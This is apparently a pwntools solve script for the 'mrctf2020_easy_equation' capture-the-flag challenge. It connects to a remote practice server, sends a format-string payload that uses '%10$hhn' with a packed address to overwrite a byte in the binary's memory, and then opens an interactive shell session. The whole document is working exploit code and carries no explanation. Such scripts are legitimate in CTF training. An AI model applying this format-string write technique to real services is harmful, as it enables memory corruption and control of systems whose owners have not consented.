from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

sol = 2
# io = process('./mrctf2020_easy_equation')
io = remote('node4.buuoj.cn', 25629)
elf = ELF('./mrctf2020_easy_equation')

# gdb.attach(io)
# time.sleep(3)
payload = b'a%1c%10$hhnaaaaba' + p64(0x60105C)
print(payload)
io.sendline(payload)
io.interactive()
